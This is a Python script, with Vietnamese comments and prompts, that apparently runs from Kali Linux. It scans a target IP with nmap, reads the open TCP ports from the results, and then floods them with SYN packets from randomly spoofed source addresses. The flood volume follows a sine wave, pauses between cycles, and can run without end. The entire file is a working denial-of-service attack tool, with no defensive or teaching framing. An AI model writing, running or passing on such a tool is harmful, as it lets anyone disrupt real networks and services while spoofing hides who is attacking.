import math
import time
import asyncio
import random
import os
import subprocess
import re
import sys
from scapy.all import IP, TCP, Raw, send, ICMP, sr1, get_if_addr, sendp, Ether, ARP, srp1, get_if_hwaddr

# --- Cấu hình chung ---
# Kích thước payload cho gói SYN Flood là rất nhỏ để tối ưu hiệu suất
SYN_FLOOD_PAYLOAD_SIZE = 1

# --- 1. Hàm lấy thông tin máy tấn công (Kali Linux) ---
def get_attacker_info(interface_name):
    """
    Lấy địa chỉ IP và MAC của máy tấn công dựa trên tên giao diện mạng.
    """
    try:
        attacker_ip = get_if_addr(interface_name)
        # MAC address is not needed for SYN Flood (L3) unless you want L2 spoofing
        # which is not common for SYN Flood
        print(f"Máy tấn công: IP = {attacker_ip} trên NIC: {interface_name}")
        return attacker_ip
    except Exception as e:
        print(f"Lỗi khi lấy thông tin máy tấn công trên giao diện {interface_name}: {e}")
        print("Hãy đảm bảo tên giao diện mạng đúng và bạn có quyền root (sudo).")
        return None

# --- 2. Hàm chạy Nmap để quét cổng TCP và lưu vào file ---
def run_nmap_scan(target_ip, output_file="nmap_scan_results.txt"):
    """
    Chạy lệnh Nmap để quét cổng TCP (-sS) và lưu kết quả vào một file.
    """
    nmap_command = [
        "sudo",
        "nmap",
        "-sS",  # SYN Scan cho TCP
        "-p", "1-65535",
        "-oN", output_file,
        target_ip
    ]
    print(f"\n--- Đang chạy lệnh Nmap: {' '.join(nmap_command)} ---")
    
    try:
        process = subprocess.run(
            nmap_command,
            capture_output=True,
            text=True,
            check=True,
            encoding='utf-8',
            shell=False
        )
        if process.stderr:
            print(f"Nmap có thông báo lỗi (stderr): \n{process.stderr}")
            
        print(f"Quét Nmap hoàn tất. Kết quả được lưu vào: {os.path.abspath(output_file)}")
        return output_file
        
    except FileNotFoundError:
        print("Lỗi: Không tìm thấy 'nmap'. Hãy đảm bảo Nmap đã được cài đặt.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Lỗi khi chạy Nmap (Mã lỗi: {e.returncode}):")
        print(f"Standard Output (nếu có):\n{e.stdout}")
        print(f"Standard Error:\n{e.stderr}")
        return None
    except Exception as e:
        print(f"Đã xảy ra lỗi không mong muốn: {e}")
        return None

# --- 3. Hàm đọc và phân tích kết quả Nmap ---  
def parse_nmap_results(file_path):
    """
    Đọc file kết quả Nmap và trích xuất IP của mục tiêu và các cổng TCP đang mở.
    """
    target_ip = None
    open_tcp_ports = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            
            ip_match = re.search(r"Nmap scan report for [^\(]*\(?([\d.]+)\)?", content)
            if ip_match:
                target_ip = ip_match.group(1)
            
            port_matches = re.findall(r"(\d+)/tcp\s+(open\|filtered|open)\s+([\w\-\.]+)", content)
            
            for match in port_matches:
                port = int(match[0])
                open_tcp_ports.append(port)
                
    except FileNotFoundError:
        print(f"Lỗi: Không tìm thấy file kết quả Nmap tại {file_path}")
        return None, None
    except Exception as e:
        print(f"Lỗi khi đọc hoặc phân tích file Nmap: {e}")
        return None, None
        
    return target_ip, open_tcp_ports

# --- 4. Hàm gửi một danh sách gói SYN bất đồng bộ (tối ưu hóa) ---
async def send_multiple_syn_packets_async(packet_list):
    """
    Tạo một coroutine để gửi toàn bộ gói tin SYN trong danh sách cùng một lúc.
    """
    try:
        if packet_list:
            # send() will handle the packets efficiently. No need to pass interface
            await asyncio.to_thread(send, packet_list, verbose=False)
    except Exception as e:
        pass

# --- 5. Hàm điều phối việc gửi gói SYN theo đồ thị hình sin (tối ưu hóa) ---
async def send_syn_packets_async_multi_agent_sine_wave(
    attacker_ip, destination_ip, destination_ports, min_agents=100, max_agents=5000,
    cycle_duration=300, rest_duration=60, total_duration=0
):
    """
    Điều phối việc gửi gói SYN theo đồ thị hình sin, mô phỏng nhiều agent.
    """
    if not destination_ports:
        print("Không có cổng đích TCP nào được tìm thấy để gửi gói. Tấn công không thể bắt đầu.")
        return

    print(f"\n--- Bắt đầu tấn công SYN Flood theo đồ thị hình sin ---")
    print(f"Tải từ {min_agents} đến {max_agents} agents. Mỗi chu kỳ sóng: {cycle_duration}s, nghỉ: {rest_duration}s.")
    
    total_packets_sent = 0
    cycle_counter = 0
    program_start_time = time.time()
    
    payload = b'Y' * SYN_FLOOD_PAYLOAD_SIZE

    while True:
        if total_duration > 0 and (time.time() - program_start_time) > total_duration:
            print("\nĐã đạt tổng thời gian chạy, kết thúc chương trình.")
            break

        cycle_counter += 1
        print(f"\n--- Bắt đầu chu kỳ tấn công #{cycle_counter} ---")
        cycle_start_time = time.time()
        
        while (time.time() - cycle_start_time) < cycle_duration:
            if total_duration > 0 and (time.time() - program_start_time) > total_duration:
                break
                
            elapsed_time = time.time() - cycle_start_time
            
            base_load = (min_agents + max_agents) / 2
            amplitude = (max_agents - min_agents) / 2
            
            current_agents = int(base_load + amplitude * math.sin(2 * math.pi * elapsed_time / cycle_duration - math.pi / 2))
            current_agents = max(current_agents, 1)

            print(f"[{elapsed_time:.2f}s] Agents hiện tại: {current_agents}", end='\r')
            
            packet_list = []
            
            # Tạo các gói tin SYN với IP giả mạo
            for _ in range(current_agents):
                source_ip_spoofed = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                source_port = random.randint(1024, 65535)
                
                # Gửi tới các cổng đích đã tìm thấy
                for dport in destination_ports:
                    packet = IP(src=source_ip_spoofed, dst=destination_ip) / \
                             TCP(sport=source_port, dport=dport, flags="S") / \
                             Raw(load=payload)
                    packet_list.append(packet)
            
            try:
                await send_multiple_syn_packets_async(packet_list)
                total_packets_sent += len(packet_list)
            except Exception as e:
                pass
            
            await asyncio.sleep(0) # Chờ 0.05 giây để tránh quá tải CPU máy tấn công
        
        if total_duration > 0 and (time.time() - program_start_time) > total_duration:
            break
            
        print(f"\nChu kỳ tấn công #{cycle_counter} hoàn tất. Đang tạm nghỉ trong {rest_duration} giây...")
        print(f"Tổng số gói đã gửi trong chu kỳ: {total_packets_sent}")
        
        await asyncio.sleep(rest_duration)
        
    print(f"\n--- Đã kết thúc tất cả các chu kỳ tấn công. Tổng số gói đã gửi: {total_packets_sent} ---")


def main():
    nmap_output_file = "nmap_scan_results.txt"

    destination_IP = input("IP destination address: ")
    attacker_interface = input("Nhập tên giao diện mạng của máy Kali (ví dụ: eth0, wlan0, ens33): ")

    source_IP = get_attacker_info(attacker_interface)
    if not source_IP:
        sys.exit(1)
        
    open_tcp_ports = []
    target_ip_from_nmap = None
    
    if os.path.exists(nmap_output_file) and os.path.getsize(nmap_output_file) > 0:
        use_old_scan = input(f"Tìm thấy kết quả quét cũ tại '{nmap_output_file}'. Bạn có muốn sử dụng nó không? (y/n): ").lower()
        if use_old_scan == 'y':
            print("Sử dụng kết quả quét Nmap cũ...")
            target_ip_from_nmap, open_tcp_ports = parse_nmap_results(nmap_output_file)
            if not target_ip_from_nmap:
                print("Lỗi: Không thể phân tích kết quả Nmap cũ. Vui lòng quét lại.")
                os.remove(nmap_output_file)
                scan_successful_file = run_nmap_scan(destination_IP, nmap_output_file)
                if scan_successful_file:
                    target_ip_from_nmap, open_tcp_ports = parse_nmap_results(scan_successful_file)
        else:
            print("Đang chạy quét Nmap mới...")
            scan_successful_file = run_nmap_scan(destination_IP, nmap_output_file)
            if scan_successful_file:
                target_ip_from_nmap, open_tcp_ports = parse_nmap_results(scan_successful_file)
    else:
        print("Không tìm thấy kết quả quét Nmap cũ. Đang chạy quét Nmap mới...")
        scan_successful_file = run_nmap_scan(destination_IP, nmap_output_file)
        if scan_successful_file:
            target_ip_from_nmap, open_tcp_ports = parse_nmap_results(scan_successful_file)

    if not target_ip_from_nmap:
        print("Không tìm thấy IP mục tiêu từ kết quả Nmap. Không thể gửi gói.")
        sys.exit(0)
    
    if not open_tcp_ports:
        print("Không tìm thấy cổng TCP mở nào từ kết quả Nmap. Tấn công sẽ sử dụng cổng 80 (HTTP) và 443 (HTTPS) làm mặc định.")
        open_tcp_ports = [80, 443]

    print(f"\n--- Phân tích kết quả Nmap ---")
    print(f"IP mục tiêu tìm thấy từ Nmap: {target_ip_from_nmap}")
    print(f"Các cổng TCP 'open' hoặc 'open|filtered' tìm thấy: {open_tcp_ports}")
    
    destination_IP_for_sending = target_ip_from_nmap

    try:
        min_agents = int(input("\nNhập số lượng agent tối thiểu (min agents): "))
        max_agents = int(input("Nhập số lượng agent tối đa (max agents): "))
        cycle_duration = int(input("Nhập thời gian của một chu kỳ sóng (giây): "))
        rest_duration = int(input("Nhập thời gian nghỉ giữa các chu kỳ (giây): "))
        total_duration = int(input("Nhập tổng thời gian tấn công (giây, nhập 0 để chạy vô hạn): "))
    except ValueError:
        print("Lỗi: Đầu vào không hợp lệ. Vui lòng nhập số nguyên.")
        sys.exit(1)

    asyncio.run(
        send_syn_packets_async_multi_agent_sine_wave(
            source_IP, destination_IP_for_sending, open_tcp_ports, min_agents=min_agents,
            max_agents=max_agents, cycle_duration=cycle_duration, rest_duration=rest_duration,
            total_duration=total_duration
        )
    )

    print("\n--- Kiểm tra Ping đến 8.8.8.8 ---")
    ping_packet = IP(dst="8.8.8.8")/ICMP()
    response = asyncio.run(asyncio.to_thread(sr1, ping_packet, timeout=2, verbose=False))

    if response:
        print(f"Ping OK: Nhận phản hồi từ {response.src}")
    else:
        print("No response (có thể do tường lửa chặn ICMP hoặc không có kết nối Internet).")

if __name__ == "__main__":
    main()
